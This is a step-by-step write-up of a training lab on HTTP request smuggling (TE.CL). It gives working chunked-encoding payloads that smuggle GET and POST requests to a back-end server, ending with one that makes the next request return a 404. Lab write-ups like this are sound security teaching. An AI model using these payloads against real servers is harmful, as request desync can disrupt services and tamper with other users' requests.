# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

## This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

## To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

---

### step 1

send homepage to repeater
change get request to post request
change HTTP /2 to HTTP/1.1
add SMUGGLED to body send request

![screenshot](images/images_lab5/lab5_homepage_post_request.jpg)

### step2

add
Transfer-Encoding: chunked
8
SMUGGLED
0

![screenshot](images/images_lab5/lab5_add_te_to_home_page.jpg)

![screenshot](images/images_lab5/lab5_te_smuggled.jpg)

### step3

increase content-Length to 19 or 20
it will give internal server error

![screenshot](images/images_lab5/lab5_internal_server_error.jpg)

### step4

test payload

```
5a
GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

![screenshot](images/images_lab5/lab5_testing_payload.jpg)

```
67
GET /post?postId=5 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![screenshot](images/images_lab5/lab5_test_payload_for_blog.jpg)

![screenshot](images/images_lab5/lab5_post_in_response.jpg)

### step6

change get request to post request

```
68
POST /post?postId=5 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![screenshot](images/images_lab5/lab5_test_post_request.jpg)

### step7

test payload to solve lab

```
5d
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![screenshot](images/images_lab5/lab5_test_payload_404_get_request.jpg)

lab will solved
404
you can also send post request to solve lab

![screenshot](images/images_lab5/lab5_testing_payload_404_post_request.jpg)

![screenshot](images/images_lab5/lab5_congratulations.jpg)
